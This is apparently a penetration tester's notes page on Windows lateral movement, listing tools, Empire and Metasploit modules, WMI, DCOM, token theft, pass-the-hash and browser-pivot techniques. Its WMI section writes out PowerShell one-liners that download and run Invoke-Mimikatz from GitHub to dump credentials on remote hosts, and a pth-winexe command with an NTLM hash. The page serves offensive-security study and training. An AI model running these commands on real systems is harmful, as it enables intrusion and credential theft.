# Lateral Movement

## Guides and Reference

<details>

<summary>Guides and Reference</summary>

* [https://www.ired.team/offensive-security/lateral-movement](https://www.ired.team/offensive-security/lateral-movement)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/remote\_access/remote\_access/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/remote\_access/remote\_access/)
* [PSExec Pass the Hash - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)&#x20;
* [Lateral Movement via DCOM: Round 2 | enigma0x3](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

</details>

## Tools

<details>

<summary>Tools</summary>

* [keimpx](https://github.com/nccgroup/keimpx) - quickly check for valid credentials across a network over SMB.
* [Sonar.js](https://github.com/mandatoryprogrammer/sonar.js) - A framework for identifying and launching exploits against internal network hosts. Works via WebRTC IP enumeration combined with WebSockets and external resource fingerprinting.&#x20;
* [SprayWMI](https://github.com/trustedsec/spraywmi) - SprayWMI is a method for mass spraying [Unicorn](https://github.com/trustedsec/unicorn) PowerShell injection to CIDR notations.
* [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries and Scripts (and also Libraries)
* [MalSCCM](https://github.com/nettitude/MalSCCM) - This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage.
* [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) - Fileless lateral movement tool that relies on ChangeServiceConfigA to run command

</details>

{% tabs %}
{% tab title="PSExec" %}
* Allows you to execute programs and code remotely using credentials
* Combine with Veil to create an obfuscated payload that can bypass AV
* _RTFM: PSExec Commands - pg. 18_
* Metasploit
  * \> use exploit/windows/smb/psexec\_psh
  * Use powershell encoded commands to mimic, ld psexec
  * It will spawn a meterpreter shell but will run in memory and not touch the disk. No need to create custom payload
{% endtab %}

{% tab title="CrackmapExec" %}
* CrackMapExec
  * Tool that sweep scans a local network with a set of harvested credentials to see what other services you can log into.
  * Built into Powershell Empire
  * Use permissions of an AD user to gain control of other systems
  * Empire module: situational\_awareness/network/powerview/find\_localadmin\_access \*\*\*Loud\*\*\*
{% endtab %}

{% tab title="PSEmpire" %}
* Powershell Empire tools
  * inveigh\_relay - SMB relay function
  * invoke\_executemsbuild - executes a powershell command on local/remote host using MSBuild.exe and an inline task.
  * invoke\_psremoting - executes a stager on remote hostss using PSRemoting. Victim must have PSRemoting enabled.
  * invoke\_sqloscmd - executes a command or stager on remote hosts using xp\_cmdshell
  * invoke\_wmi - execute a stager on remote hosts via WMI
  * jenkins\_script\_console - Deploys an empire agent against a Jenkins server with unauthed access to script console.
  * invoke\_dcom - invoke commands on remote hosts using MMC20.Application COM object over DCOM.
  * invoke\_psexec 0 executes a stager on remote host using PsExec type functionality. Oldy but a goodie
  * invoke\_smbexec - using samba tools
  * invoke\_sshcommand - executes a command on a remote host via SSH
  * Invoke\_wmi\_debugger - uses WMI to set the debugger for a target binary on a remote hosts to be cmd.exe or a stager
  * new\_gpo\_immediate\_task - Builds and immediate schtask to push through a specified GPO. mist have access to modify GPOs
    * [http://harmj0y.net/blog/empire/empire-1-5](http://harmj0y.net/blog/empire/empire-1-5)
  * _PTFM: Empire Admin Tools - pg. 52_
{% endtab %}
{% endtabs %}

## Techniques

{% tabs %}
{% tab title="WMI" %}
* Once you have harvested credentials and elevated the session on your current target, you can send remote commands to other devices using WMI
* Remote Mimikatz attack
  * \> wmic /USER:"hacker\testuser1" /PASSWORD:"asdfasdfasdf!" /NODE:\[target ip] process call create “powershell.exe -exec bypass IEX (Net-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/Powersploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\\Users\\\public\\\a.txt”
  * dir\\\\\[target hostname]\c$\Users\Public\\
  * type\\\\\[target hostname]\c$\Users\Public\a.txt
  * del\\\\\[target hostname]\c$\Userse\Public\a.txt
* MassMimikatz - a better way to do the remote mimikatz attack
  * \> powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.Webclient).downloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1'); “'hostname1','hostname2' | Invoke-MassMimikatz -Verbose -FireWillRule”
{% endtab %}

{% tab title="DCOM" %}
* DCOM is a windows feature for communicating between software components on different remote machines
* These can be used when traditional options like WMI, Powershell remoting, and PSExec are being monitored.
* List all a machine's DCOM applications with powershell
  * Get-CimInstance Win32\_DCOMApplication
* There are many objects that allow remote code execution: ShellBrowserWindows, ShellWindows
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* _PTFM: DCOM- pg. 52_
{% endtab %}

{% tab title="Stealing Tokens" %}
* Stealing tokens
  * Metasploit Incognito - steal user tokens
  * Powershell Empire: steal\_tokens
  * Inject a new agent into a running process owned by a different user
    * PSInject - inject agent into processes using ReflectivePick to load up the .NET clanguage runtime into a process and execute a Powershell command without a new powershell.exe process
    * This will start a new agent running as a process owned by the new target.
    * [http://bit.ly/2HDxj6x](http://bit.ly/2HDxj6x)
{% endtab %}

{% tab title="MSSQL DB Links" %}
* [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [SQL Server Link Crawling with PowerUpSQL](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)
{% endtab %}

{% tab title="SCCM" %}
* [Targeted Workstation Compromise With Sccm](https://enigma0x3.net/2015/10/27/targeted-workstation-compromise-with-sccm/)
* [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)


{% endtab %}

{% tab title="WSUS" %}
* [Remote Weaponization of WSUS MITM](https://www.sixdub.net/?p=623)
* [WSUSpendu](https://www.blackhat.com/docs/us-17/wednesday/us-17-Coltel-WSUSpendu-Use-WSUS-To-Hang-Its-Clients-wp.pdf)
* [Leveraging WSUS – Part One](https://ijustwannared.team/2018/10/15/leveraging-wsus-part-one/)
{% endtab %}
{% endtabs %}

<details>

<summary>Pass-the-hash</summary>

&#x20;[https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)

* Basic Local admin attack - the old way
  * Currently most local admin accounts are disabled by default and utilize LAPS to protect passwords
  * Requirements: local admin enabled, and RID is 500
  * If available we can run a a few modules to pull out those hashes.
  * Empire module: powershell/credentials/powerdump
  * Metasploit: [http://bit.ly/2qzsyDI](http://bit.ly/2qzsyDI)
* Breaking LAPS
  * metasploit - enum\_laps.rb
  * [https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/](https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/)
* pth-winexe
  * Pass the hash toolkit - modified winexe, performs auth using SMB
  * \# pth-winexe -U \[NTLM hash] \[SMB share] \[command to execute
  * \# pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
* [Performing Pass-the-hash Attacks With Mimikatz](https://blog.stealthbits.com/passing-the-hash-with-mimikatz)
* [How to Pass-the-Hash with Mimikatz](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/)
* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
* _PTFM: Metasploit/Emipre Pass-the-hash - pg. 52_

</details>

<details>

<summary>Browser Pivot</summary>

* Used to access an application that the user of the compromised workstation accesses regularly.
* This method can bypass authentication to that application
* Tasks: Inject code into IE process accessing the medical database, create a web proxy DLL based on the WnInet API, and passw eb traffic through our ssh tunnel and the new proxy
* Stage 1: DLL Injection - Injecting code into a currently running process
  * Attach to the target process
  * Allocate memory within the target process
  * Copy the DLL into the target process memory and calculate an appropriate memory addresses
  * Instruct target process to execute your DLLL
* Stage 2: Create a Proxy DLL based on the WinInet API
  * Any program can use the WinInet API, and it can handle tasks such as cookie and session managment, auth, etc...
  * WinInet API performs Auth on a per process basis
  * Inject our own proxy server into targets IE process and route our web traffic through it and inherit application session states. Including those with 2FA!
* Stage 3: Using the injected proxy server
  * Now we have an HTTP proxy running on our target machine and restructed it to the local ethernet int.
  * Next we must hardcode an additional tunnel into our payload.&#x20;

</details>

#### Password Spraying

{% content-ref url="password-attacks.md" %}
[password-attacks.md](password-attacks.md)
{% endcontent-ref %}

#### **Misc Techniques**

* Admin Shares
  * _PTFM: Admin Shares - pg. 51_
* SSH Hijack
  * _PTFM: SSH Hijack- pg. 110_
